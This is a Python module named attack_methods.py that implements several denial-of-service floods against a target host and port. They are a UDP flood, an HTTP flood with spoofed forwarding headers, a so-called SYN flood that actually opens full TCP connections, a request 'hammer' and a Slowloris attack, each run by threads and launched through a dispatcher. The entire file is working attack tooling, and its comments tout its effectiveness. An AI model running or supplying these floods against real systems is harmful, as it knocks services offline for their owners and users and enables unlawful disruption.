# attack_methods.py
import time
import socket
import random
import threading
import ssl
import struct
import requests
from urllib.parse import urlparse
import urllib3

# Disable warnings for cleaner output
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Global variables for enhanced attacks
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
]

# Thread management - optimized for performance without crashing
MAX_THREADS = 300  # Balanced for effectiveness without overload
active_threads = threading.Semaphore(MAX_THREADS)

def resolve_target(target):
    """Resolve a target (URL or IP) to IP address and port"""
    try:
        # If it's already an IP:port format
        if ":" in target and not target.startswith("http"):
            parts = target.split(":")
            if len(parts) == 2:
                return parts[0], int(parts[1])
        
        # Parse URL if it starts with http/https
        if target.startswith("http"):
            parsed = urlparse(target)
            hostname = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            return hostname, port
        else:
            # Assume it's a domain without scheme
            hostname = target
            port = 80  # Default to port 80
            return hostname, port
    except Exception as e:
        raise ValueError(f"Could not resolve target: {target} - {str(e)}")

def attack_udp_god(target, duration):
    """Optimized UDP flood that won't crash your WiFi"""
    ip, port = resolve_target(target)
    
    threads_count = 150  # Balanced for effectiveness
    packet_size = 1024   # Reasonable packet size
    
    def flood():
        with active_threads:
            end_time = time.time() + duration
            
            while time.time() < end_time:
                try:
                    # Use context manager to ensure socket cleanup
                    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                        sock.settimeout(1)
                        data = random._urandom(packet_size)
                        
                        # Send multiple packets but with controlled rate
                        for _ in range(30):  # Reasonable packets per iteration
                            if time.time() >= end_time:
                                break
                            sock.sendto(data, (ip, port))
                            
                        # Small delay to prevent network card overload
                        time.sleep(0.05)
                except Exception:
                    # Brief pause on error to prevent rapid reconnection attempts
                    time.sleep(0.1)
    
    # Start threads
    threads = []
    for _ in range(threads_count):
        t = threading.Thread(target=flood)
        t.daemon = True
        threads.append(t)
        t.start()
    
    # Wait for duration
    time.sleep(duration)
    for t in threads:
        try:
            t.join(timeout=1.0)
        except:
            pass

def attack_http_flood(target, duration):
    """Effective HTTP flood that actually works"""
    ip, port = resolve_target(target)
    use_ssl = port == 443
    
    threads_count = 100  # Effective thread count
    
    # Enhanced headers and paths
    paths = [
        "/", "/wp-admin.php", "/admin/login", "/api/v1/users",
        "/search", "/checkout", "/cart", "/product/123",
        "/user/profile", "/ajax/search", "/graphql", "/wp-json/wp/v2/posts"
    ]
    
    methods = ["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS"]
    
    def build_request(target_host):
        method = random.choice(methods)
        path = random.choice(paths)
        
        headers = [
            f"{method} {path} HTTP/1.1",
            f"Host: {target_host}",
            f"User-Agent: {random.choice(USER_AGENTS)}",
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            f"Accept-Language: en-US,en;q=0.5",
            f"Accept-Encoding: gzip, deflate, br",
            f"Cache-Control: no-cache",
            f"X-Forwarded-For: {'.'.join(str(random.randint(1, 255)) for _ in range(4))}",
            f"X-Real-IP: {'.'.join(str(random.randint(1, 255)) for _ in range(4))}",
            f"Connection: keep-alive",
            f"Upgrade-Insecure-Requests: 1",
        ]
        
        if method == "POST":
            headers.extend([
                "Content-Type: application/x-www-form-urlencoded",
                f"Content-Length: {random.randint(100, 500)}"
            ])
        
        return "\r\n".join(headers) + "\r\n\r\n"
    
    def flood():
        with active_threads:
            end_time = time.time() + duration
            
            while time.time() < end_time:
                try:
                    # Use context manager for proper socket cleanup
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                        sock.settimeout(5)
                        
                        if use_ssl:
                            context = ssl.create_default_context()
                            context.check_hostname = False
                            context.verify_mode = ssl.CERT_NONE
                            with context.wrap_socket(sock, server_hostname=ip) as ssock:
                                ssock.connect((ip, port))
                                request = build_request(ip)
                                ssock.sendall(request.encode())
                        else:
                            sock.connect((ip, port))
                            request = build_request(ip)
                            sock.sendall(request.encode())
                            
                        # Small delay between requests
                        time.sleep(0.05)
                            
                except Exception:
                    # Handle errors without affecting client
                    time.sleep(0.1)
    
    # Start threads
    threads = []
    for _ in range(threads_count):
        t = threading.Thread(target=flood)
        t.daemon = True
        threads.append(t)
        t.start()
    
    # Wait for duration
    time.sleep(duration)
    for t in threads:
        try:
            t.join(timeout=1.0)
        except:
            pass

def attack_tcp_syn(target, duration):
    """TCP SYN flood that actually works"""
    ip, port = resolve_target(target)
    
    threads_count = 80  # Effective thread count
    
    def syn_flood():
        with active_threads:
            end_time = time.time() + duration
            
            while time.time() < end_time:
                try:
                    # Use regular sockets instead of raw sockets for better compatibility
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((ip, port))
                    # Send some data to make it more effective
                    s.send(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
                    time.sleep(0.1)
                    s.close()
                except:
                    # If connection fails, just continue
                    pass
                
                # Small delay to prevent overwhelming the system
                time.sleep(0.01)
    
    # Start threads
    threads = []
    for _ in range(threads_count):
        t = threading.Thread(target=syn_flood)
        t.daemon = True
        threads.append(t)
        t.start()
    
    time.sleep(duration)
    for t in threads:
        try:
            t.join(timeout=1.0)
        except:
            pass

def attack_hammer(target, duration):
    """Optimized hammer attack that actually works"""
    ip, port = resolve_target(target)
    
    threads_count = 120  # Effective thread count
    
    def hammer_request():
        with active_threads:
            end_time = time.time() + duration
            
            while time.time() < end_time:
                try:
                    # Create HTTP request
                    headers = {
                        'User-Agent': random.choice(USER_AGENTS),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate',
                        'Connection': 'keep-alive',
                        'Upgrade-Insecure-Requests': '1',
                        'Cache-Control': 'max-age=0',
                    }
                    
                    # Use requests with timeout to prevent hanging
                    if port == 443:
                        url = f"https://{ip}:{port}/"
                    else:
                        url = f"http://{ip}:{port}/"
                    
                    response = requests.get(url, headers=headers, timeout=5, verify=False)
                    
                except Exception:
                    # Handle any errors gracefully
                    pass
                
                # Small delay between requests
                time.sleep(0.1)
    
    # Start threads
    threads = []
    for _ in range(threads_count):
        t = threading.Thread(target=hammer_request)
        t.daemon = True
        threads.append(t)
        t.start()
    
    time.sleep(duration)
    for t in threads:
        try:
            t.join(timeout=1.0)
        except:
            pass

def attack_slowloris(target, duration):
    """Improved Slowloris attack that actually works"""
    ip, port = resolve_target(target)
    use_ssl = port == 443
    
    sockets_count = 150  # Effective socket count
    sockets = []
    
    # Create initial sockets
    for _ in range(sockets_count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=ip)
            
            s.connect((ip, port))
            s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n".encode())
            sockets.append(s)
        except:
            pass
    
    end_time = time.time() + duration
    
    # Keep connections alive
    while time.time() < end_time and sockets:
        for s in list(sockets):  # Use list copy to avoid modification during iteration
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
            except:
                try:
                    s.close()
                    sockets.remove(s)
                    # Try to create a new socket to replace the lost one
                    try:
                        new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        new_s.settimeout(3)
                        
                        if use_ssl:
                            context = ssl.create_default_context()
                            context.check_hostname = False
                            context.verify_mode = ssl.CERT_NONE
                            new_s = context.wrap_socket(new_s, server_hostname=ip)
                        
                        new_s.connect((ip, port))
                        new_s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n".encode())
                        sockets.append(new_s)
                    except:
                        pass
                except:
                    pass
        
        # Reasonable interval
        time.sleep(10)
    
    # Clean up
    for s in sockets:
        try:
            s.close()
        except:
            pass

# Attack dispatcher for easy calling
ATTACK_METHODS = {
    "udp": attack_udp_god,
    "http": attack_http_flood,
    "syn": attack_tcp_syn,
    "hammer": attack_hammer,
    "slowloris": attack_slowloris,
}

def launch_attack(method, target, duration):
    """Launch an attack with the specified method"""
    if method in ATTACK_METHODS:
        print(f"Starting {method} attack on {target} for {duration} seconds")
        ATTACK_METHODS[method](target, duration)
        print(f"{method} attack on {target} completed")
    else:
        print(f"Unknown attack method: {method}")
